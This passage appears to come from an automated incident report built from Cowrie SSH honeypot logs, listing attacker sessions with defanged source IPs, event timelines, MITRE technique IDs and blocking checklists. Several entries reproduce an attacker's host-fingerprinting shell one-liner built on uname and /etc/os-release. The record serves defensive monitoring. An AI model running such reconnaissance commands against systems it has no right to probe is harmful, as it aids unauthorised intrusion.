| `2026-08-23 18:31:20` | `cowrie.command.input` |
| `2026-08-23 18:31:20` | `cowrie.command.input` |
| `2026-08-23 18:31:20` | `cowrie.command.input` |
| `2026-08-23 18:31:20` | `cowrie.command.success` |
| `2026-08-23 18:31:20` | `cowrie.command.input` |
| `2026-08-23 18:31:20` | `cowrie.command.input` |
| `2026-08-23 18:31:20` | `cowrie.command.input` |
| `2026-08-23 18:31:20` | `cowrie.command.input` |
| `2026-08-23 18:31:20` | `cowrie.log.closed` |
| `2026-08-23 18:31:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9a6cf6583e1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 18:31 |
| **Last Seen** | 2026-08-23 18:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:31:48` | `cowrie.session.connect` |
| `2026-08-23 18:31:48` | `cowrie.client.version` |
| `2026-08-23 18:31:48` | `cowrie.client.kex` |
| `2026-08-23 18:31:49` | `cowrie.login.success` |
| `2026-08-23 18:31:49` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:31:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 18:31:50` | `cowrie.direct-tcpip.data` |
| `2026-08-23 18:31:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98bfd17add84

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 18:31 |
| **Last Seen** | 2026-08-23 18:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:31:52` | `cowrie.session.connect` |
| `2026-08-23 18:31:52` | `cowrie.client.version` |
| `2026-08-23 18:31:52` | `cowrie.client.kex` |
| `2026-08-23 18:31:53` | `cowrie.login.success` |
| `2026-08-23 18:31:53` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:31:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 18:31:53` | `cowrie.direct-tcpip.data` |
| `2026-08-23 18:31:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c87849799ad8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 18:33 |
| **Last Seen** | 2026-08-23 18:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:33:16` | `cowrie.session.connect` |
| `2026-08-23 18:33:16` | `cowrie.client.version` |
| `2026-08-23 18:33:16` | `cowrie.client.kex` |
| `2026-08-23 18:33:17` | `cowrie.login.success` |
| `2026-08-23 18:33:18` | `cowrie.session.params` |
| `2026-08-23 18:33:18` | `cowrie.command.input` |
| `2026-08-23 18:33:18` | `cowrie.command.input` |
| `2026-08-23 18:33:18` | `cowrie.command.input` |
| `2026-08-23 18:33:18` | `cowrie.command.input` |
| `2026-08-23 18:33:18` | `cowrie.command.input` |
| `2026-08-23 18:33:18` | `cowrie.command.success` |
| `2026-08-23 18:33:18` | `cowrie.command.input` |
| `2026-08-23 18:33:18` | `cowrie.command.input` |
| `2026-08-23 18:33:18` | `cowrie.command.input` |
| `2026-08-23 18:33:18` | `cowrie.command.input` |
| `2026-08-23 18:33:19` | `cowrie.log.closed` |
| `2026-08-23 18:33:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a8789a8e548

| Field | Detail |
|---|---|
| **Source IP** | `181.119.64[.]79` |
| **First Seen** | 2026-08-23 18:33 |
| **Last Seen** | 2026-08-23 18:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:33:45` | `cowrie.session.connect` |
| `2026-08-23 18:33:45` | `cowrie.client.version` |
| `2026-08-23 18:33:45` | `cowrie.client.kex` |
| `2026-08-23 18:33:46` | `cowrie.login.success` |
| `2026-08-23 18:33:47` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:33:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.119.64[.]79` to AbuseIPDB if not already reported
- [ ] Block `181.119.64[.]79` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f3e0bdbfcda

| Field | Detail |
|---|---|
| **Source IP** | `113.158.205[.]225` |
| **First Seen** | 2026-08-23 18:33 |
| **Last Seen** | 2026-08-23 18:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:33:56` | `cowrie.session.connect` |
| `2026-08-23 18:33:57` | `cowrie.client.version` |
| `2026-08-23 18:33:57` | `cowrie.client.kex` |
| `2026-08-23 18:34:00` | `cowrie.login.success` |
| `2026-08-23 18:34:00` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:34:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.158.205[.]225` to AbuseIPDB if not already reported
- [ ] Block `113.158.205[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98639150d45c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 18:35 |
| **Last Seen** | 2026-08-23 18:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:35:20` | `cowrie.session.connect` |
| `2026-08-23 18:35:20` | `cowrie.client.version` |
| `2026-08-23 18:35:20` | `cowrie.client.kex` |
| `2026-08-23 18:35:20` | `cowrie.login.success` |
| `2026-08-23 18:35:21` | `cowrie.session.params` |
| `2026-08-23 18:35:21` | `cowrie.command.input` |
| `2026-08-23 18:35:21` | `cowrie.command.input` |
| `2026-08-23 18:35:21` | `cowrie.command.input` |
| `2026-08-23 18:35:21` | `cowrie.command.input` |
| `2026-08-23 18:35:21` | `cowrie.command.input` |
| `2026-08-23 18:35:21` | `cowrie.command.success` |
| `2026-08-23 18:35:21` | `cowrie.command.input` |
| `2026-08-23 18:35:21` | `cowrie.command.input` |
| `2026-08-23 18:35:21` | `cowrie.command.input` |
| `2026-08-23 18:35:21` | `cowrie.command.input` |
| `2026-08-23 18:35:21` | `cowrie.log.closed` |
| `2026-08-23 18:35:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4dd434f6bd5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 18:37 |
| **Last Seen** | 2026-08-23 18:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:37:23` | `cowrie.session.connect` |
| `2026-08-23 18:37:23` | `cowrie.client.version` |
| `2026-08-23 18:37:23` | `cowrie.client.kex` |
| `2026-08-23 18:37:24` | `cowrie.login.success` |
| `2026-08-23 18:37:25` | `cowrie.session.params` |
| `2026-08-23 18:37:25` | `cowrie.command.input` |
| `2026-08-23 18:37:25` | `cowrie.command.input` |
| `2026-08-23 18:37:25` | `cowrie.command.input` |
| `2026-08-23 18:37:25` | `cowrie.command.input` |
| `2026-08-23 18:37:25` | `cowrie.command.input` |
| `2026-08-23 18:37:25` | `cowrie.command.success` |
| `2026-08-23 18:37:25` | `cowrie.command.input` |
| `2026-08-23 18:37:25` | `cowrie.command.input` |
| `2026-08-23 18:37:25` | `cowrie.command.input` |
| `2026-08-23 18:37:25` | `cowrie.command.input` |
| `2026-08-23 18:37:25` | `cowrie.log.closed` |
| `2026-08-23 18:37:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76d2cc4a22a5

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]137` |
| **First Seen** | 2026-08-23 18:38 |
| **Last Seen** | 2026-08-23 18:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:38:33` | `cowrie.session.connect` |
| `2026-08-23 18:38:34` | `cowrie.client.version` |
| `2026-08-23 18:38:34` | `cowrie.client.kex` |
| `2026-08-23 18:38:35` | `cowrie.login.success` |
| `2026-08-23 18:38:35` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:38:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]137` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28dd0740b775

| Field | Detail |
|---|---|
| **Source IP** | `60.174.39[.]82` |
| **First Seen** | 2026-08-23 18:38 |
| **Last Seen** | 2026-08-23 18:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:38:40` | `cowrie.session.connect` |
| `2026-08-23 18:38:41` | `cowrie.client.version` |
| `2026-08-23 18:38:41` | `cowrie.client.kex` |
| `2026-08-23 18:38:43` | `cowrie.login.success` |
| `2026-08-23 18:38:44` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:38:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.174.39[.]82` to AbuseIPDB if not already reported
- [ ] Block `60.174.39[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae300d1d1f62

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 18:39 |
| **Last Seen** | 2026-08-23 18:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:39:21` | `cowrie.session.connect` |
| `2026-08-23 18:39:21` | `cowrie.client.version` |
| `2026-08-23 18:39:21` | `cowrie.client.kex` |
| `2026-08-23 18:39:22` | `cowrie.login.success` |
| `2026-08-23 18:39:23` | `cowrie.session.params` |
| `2026-08-23 18:39:23` | `cowrie.command.input` |
| `2026-08-23 18:39:23` | `cowrie.command.input` |
| `2026-08-23 18:39:23` | `cowrie.command.input` |
| `2026-08-23 18:39:23` | `cowrie.command.input` |
| `2026-08-23 18:39:23` | `cowrie.command.input` |
| `2026-08-23 18:39:23` | `cowrie.command.success` |
| `2026-08-23 18:39:23` | `cowrie.command.input` |
| `2026-08-23 18:39:23` | `cowrie.command.input` |
| `2026-08-23 18:39:23` | `cowrie.command.input` |
| `2026-08-23 18:39:23` | `cowrie.command.input` |
| `2026-08-23 18:39:24` | `cowrie.log.closed` |
| `2026-08-23 18:39:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e54ed8afc0d5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 18:41 |
| **Last Seen** | 2026-08-23 18:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:41:16` | `cowrie.session.connect` |
| `2026-08-23 18:41:16` | `cowrie.client.version` |
| `2026-08-23 18:41:16` | `cowrie.client.kex` |
| `2026-08-23 18:41:17` | `cowrie.login.success` |
| `2026-08-23 18:41:17` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:41:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 18:41:17` | `cowrie.direct-tcpip.data` |
| `2026-08-23 18:41:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce79981ccb24

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 18:41 |
| **Last Seen** | 2026-08-23 18:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:41:18` | `cowrie.session.connect` |
| `2026-08-23 18:41:18` | `cowrie.client.version` |
| `2026-08-23 18:41:18` | `cowrie.client.kex` |
| `2026-08-23 18:41:19` | `cowrie.login.success` |
| `2026-08-23 18:41:21` | `cowrie.session.params` |
| `2026-08-23 18:41:21` | `cowrie.command.input` |
| `2026-08-23 18:41:21` | `cowrie.command.input` |
| `2026-08-23 18:41:21` | `cowrie.command.input` |
| `2026-08-23 18:41:21` | `cowrie.command.input` |
| `2026-08-23 18:41:21` | `cowrie.command.input` |
| `2026-08-23 18:41:21` | `cowrie.command.success` |
| `2026-08-23 18:41:21` | `cowrie.command.input` |
| `2026-08-23 18:41:21` | `cowrie.command.input` |
| `2026-08-23 18:41:21` | `cowrie.command.input` |
| `2026-08-23 18:41:21` | `cowrie.command.input` |
| `2026-08-23 18:41:21` | `cowrie.log.closed` |
| `2026-08-23 18:41:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d5ad9e7aa14

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 18:41 |
| **Last Seen** | 2026-08-23 18:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:41:20` | `cowrie.session.connect` |
| `2026-08-23 18:41:20` | `cowrie.client.version` |
| `2026-08-23 18:41:20` | `cowrie.client.kex` |
| `2026-08-23 18:41:21` | `cowrie.login.success` |
| `2026-08-23 18:41:22` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:41:22` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 18:41:22` | `cowrie.direct-tcpip.data` |
| `2026-08-23 18:41:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6df6c8fe912

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 18:43 |
| **Last Seen** | 2026-08-23 18:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:43:15` | `cowrie.session.connect` |
| `2026-08-23 18:43:15` | `cowrie.client.version` |
| `2026-08-23 18:43:15` | `cowrie.client.kex` |
| `2026-08-23 18:43:15` | `cowrie.login.success` |
| `2026-08-23 18:43:16` | `cowrie.session.params` |
| `2026-08-23 18:43:16` | `cowrie.command.input` |
| `2026-08-23 18:43:16` | `cowrie.command.input` |
| `2026-08-23 18:43:16` | `cowrie.command.input` |
| `2026-08-23 18:43:16` | `cowrie.command.input` |
| `2026-08-23 18:43:16` | `cowrie.command.input` |
| `2026-08-23 18:43:16` | `cowrie.command.success` |
| `2026-08-23 18:43:16` | `cowrie.command.input` |
| `2026-08-23 18:43:16` | `cowrie.command.input` |
| `2026-08-23 18:43:16` | `cowrie.command.input` |
| `2026-08-23 18:43:16` | `cowrie.command.input` |
| `2026-08-23 18:43:17` | `cowrie.log.closed` |
| `2026-08-23 18:43:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3890321f802b

| Field | Detail |
|---|---|
| **Source IP** | `218.248.19[.]102` |
| **First Seen** | 2026-08-23 18:44 |
| **Last Seen** | 2026-08-23 18:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:44:54` | `cowrie.session.connect` |
| `2026-08-23 18:44:55` | `cowrie.client.version` |
| `2026-08-23 18:44:55` | `cowrie.client.kex` |
| `2026-08-23 18:44:57` | `cowrie.login.success` |
| `2026-08-23 18:44:58` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:45:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.248.19[.]102` to AbuseIPDB if not already reported
- [ ] Block `218.248.19[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f94c5658aedf

| Field | Detail |
|---|---|
| **Source IP** | `159.224.97[.]134` |
| **First Seen** | 2026-08-23 18:45 |
| **Last Seen** | 2026-08-23 18:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:45:03` | `cowrie.session.connect` |
| `2026-08-23 18:45:03` | `cowrie.client.version` |
| `2026-08-23 18:45:03` | `cowrie.client.kex` |
| `2026-08-23 18:45:04` | `cowrie.login.success` |
| `2026-08-23 18:45:05` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:45:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.224.97[.]134` to AbuseIPDB if not already reported
- [ ] Block `159.224.97[.]134` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f3d90d3cbcd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 18:45 |
| **Last Seen** | 2026-08-23 18:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:45:04` | `cowrie.session.connect` |
| `2026-08-23 18:45:04` | `cowrie.client.version` |
| `2026-08-23 18:45:04` | `cowrie.client.kex` |
| `2026-08-23 18:45:05` | `cowrie.login.success` |
| `2026-08-23 18:45:07` | `cowrie.session.params` |
| `2026-08-23 18:45:07` | `cowrie.command.input` |
| `2026-08-23 18:45:07` | `cowrie.command.input` |
| `2026-08-23 18:45:07` | `cowrie.command.input` |
| `2026-08-23 18:45:07` | `cowrie.command.input` |
| `2026-08-23 18:45:07` | `cowrie.command.input` |
| `2026-08-23 18:45:07` | `cowrie.command.success` |
| `2026-08-23 18:45:07` | `cowrie.command.input` |
